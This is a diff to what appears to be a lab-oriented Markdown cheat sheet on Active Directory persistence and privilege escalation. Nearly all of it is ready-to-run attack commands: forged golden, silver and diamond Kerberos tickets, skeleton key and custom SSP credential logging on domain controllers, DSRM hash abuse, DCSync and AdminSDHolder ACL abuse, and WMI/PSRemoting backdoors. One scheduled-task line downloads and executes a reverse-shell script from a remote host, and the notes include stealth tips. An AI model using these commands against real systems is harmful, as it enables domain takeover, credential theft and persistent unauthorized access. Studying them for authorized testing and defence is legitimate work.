@@ -82,6 +82,8 @@ Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:h
 {% code overflow="wrap" %}
 ```powershell
 Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dom.local /sid:domain-sid /aes256:aeshash /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 {% endcode %}
 
@@ -114,7 +116,7 @@ Machine account hash (e.g. after krbtgt&#x20;
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:cifs /rc4:hash /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:cifs /rc4:hash /user:Administrator /ptt"'
 ```
 {% endcode %}
 
@@ -129,14 +131,12 @@ Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /targ
 
 **Schedudle an execute a task with silver ticket of "HOST" Service**
 
-{% code overflow="wrap" %}
-```powershell
-Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:host /rc4:hash /user:Administrator /ptt"'
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:host /rc4:hash /user:Administrator /ptt"'
 
-schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'"
-schtasks /Run /S hostname.dom.local /TN "STCheck"
-```
-{% endcode %}
+<strong>schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'"
+</strong><strong>
+</strong>schtasks /Run /S hostname.dom.local /TN "STCheck"
+</code></pre>
 
 {% hint style="info" %}
 * Attention: Within Download String these are two '
@@ -167,6 +167,8 @@ Krbtgt AES Key
 ```powershell
 Rubeus.exe diamond
 /krbkey:hash /user:yourusername /password:yourpw /enctype:aes /ticketuser:administrator /domain:dom.local /dc:dcname.dom.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show ptt
+
+Note that RC4 or AES keys of the user can be used too!
 
 use /tgtdeleg in place of credentials in case we have access as a domain user
 Rubeus.exe diamond
@@ -210,8 +212,8 @@ SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
 {% code overflow="wrap" %}
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local
-
-Now you can login with the password "mimikatz" e.g. with Enter-PSSession -computername dc-hostname -credential dom\Administrator  => with the Password mimikatz
+Enter-PSSession -computername dc-hostname -credential dom\Administrator
+Now you can login with the password "mimikatz"
 ```
 {% endcode %}
 
@@ -254,7 +256,7 @@ Noisy in logs - Service Installation for a kernel mode driver will be displayed
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz - Command '"token::elevate" "lsadump::sam"' -computername dchostname.dc.local
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -computername dchostname.dc.local
 ```
 {% endcode %}
 
@@ -272,7 +274,7 @@ Invoke-Mimikatz - Command '"lsadump:lsa /patch"' -computername dchostname.dc.loc
 **Change the logon behaviour of the DSRM Account before we can use the DSRM Hash**
 
 <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Enter-PSsession -computername dchostname.dc.local
-</strong>New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" - name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+</strong>New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 -------------------------------------------------------------
 -or if it already exist -
 Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" - name "DsrmAdminLogonBehavior" -Value 2
@@ -283,7 +285,7 @@ Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz -command '"sekurlsa::pth /domain:!domaincontroller-name-here! /user:Administrator /ntlm:ntlm-hash-of-dsrm /run:powershell.exe
+Invoke-Mimikatz -command '"sekurlsa::pth /domain:!domaincontroller-name-here! /user:Administrator /ntlm:ntlm-hash-of-dsrm /run:powershell.exe"'
 
 ls \\dc\c$
 ```
@@ -315,6 +317,7 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Sec
 Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -name 'Security Packages' -value $packages
 Reboot the server
 All logons on the DC are logged to C:\Windows\system32\kiwissp.log
+
 ```
 {% endcode %}
 
@@ -324,7 +327,8 @@ All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 ```powershell
 Invoke-Mimikatz -command '"misc::memssp"'
 No reboot required
-All logons on the DC are logged to C:\Windows\system32\kiwissp.log
+All logons on the DC are logged to C:\Windows\System32\mimilsa.log
+
 ```
 {% endcode %}
 
@@ -390,10 +394,15 @@ $sess = NewPsSession -computername dchostn.local
 Invoke-Command -filepath .\Invoke-SDPropagator.ps -sessoin $sess
 Enter-pssession -sesion $sess
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+
+❗Remember to add your user to other protected groups to be stealthier
+
+Pre-Server 2008:
+Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
 ```
 {% endcode %}
 
-Check Domain Admins permissoins&#x20;
+Check Domain Admins permissions as regular user&#x20;
 
 {% code overflow="wrap" %}
 ```powershell
@@ -430,8 +439,6 @@ Add-ADGroupMember -identity 'domain admins' -members yourusername -verbose
 ```
 {% endcode %}
 
-
-
 **ResetPassword using PowerView\_dev**
 
 {% code overflow="wrap" %}
@@ -442,23 +449,6 @@ Using AD Module
 Set-ADAccountPassword -Identity yourusername -newPassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose
 ```
 {% endcode %}
-
-**Run SDpropgator to apply the AdminSDHolder on all the Protected Groups**
-
-{% code overflow="wrap" %}
-```powershell
-. .\Invoke-SDPropagator
-Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
-❗Remember to add your user to other protected groups to be stealthier
-
-Pre-Server 2008:
-Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
-```
-{% endcode %}
-
-
-
-
 
 ## 🔑ACL - Right Abuse / DCSync&#x20;
 
@@ -490,10 +480,18 @@ Set-ADACL -samaccountname username -distinguishedname 'DC=subodmain,DC=domain,DC
 
 {% code overflow="wrap" %}
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'DC=subodmain,DC=domain,DC=local' -PrincipalIdentity yourusername -Rights DCSync  -principaldomain dom.local -targetdomain dom.local -verbose
+Add-DomainObjectAcl -TargetIdentity 'DC=subodmain,DC=domain,DC=local' -PrincipalIdentity yourusername -Rights DCSync -principaldomain dom.local -targetdomain dom.local -verbose
 
 Using AD Module
 Set-ADACL -samaccountname username -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -GUIDRight DCSync -verbose
+```
+{% endcode %}
+
+**Check for DCSync rights of a User**
+
+{% code overflow="wrap" %}
+```powershell
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentx"}
 ```
 {% endcode %}
 
@@ -547,6 +545,12 @@ Execute commands via WMI now possible
 ```
 {% endcode %}
 
+**Load RACE (for Set-RemoteWMI)**
+
+```powershell
+. .\RACE.ps1
+```
+
 **Modify WMI ACL to allow non-admin users access to securable objects**
 
 {% code overflow="wrap" %}
@@ -581,7 +585,7 @@ Invoke-Command -scriptblock{whoami} -computername dchost.dc.local => Does not wo
 ```
 {% endcode %}
 
-**PSRemoting: On local machine for user1**
+~~**PSRemoting: On local machine for user1**~~** - not stable after August 2020 patches**
 
 {% code overflow="wrap" %}
 ```powershell
@@ -589,7 +593,7 @@ Set-RemotePSRemoting -username user1 -verbose
 ```
 {% endcode %}
 
-**PSRemoting: On remote machine for user1 without credentials**
+~~**PSRemoting: On remote machine for user1 without credentials**~~** - not stable after August 2020 patches**
 
 {% code overflow="wrap" %}
 ```powershell
@@ -598,7 +602,7 @@ Invoke-Command -scriptblock{whoami} -computername dchost.dc.local => Works
 ```
 {% endcode %}
 
-**PSRemoting: On remote machine remove user1**&#x20;
+~~**PSRemoting: On remote machine remove user1**  ~~  **- not stable after August 2020 patches**
 
 {% code overflow="wrap" %}
 ```powershell
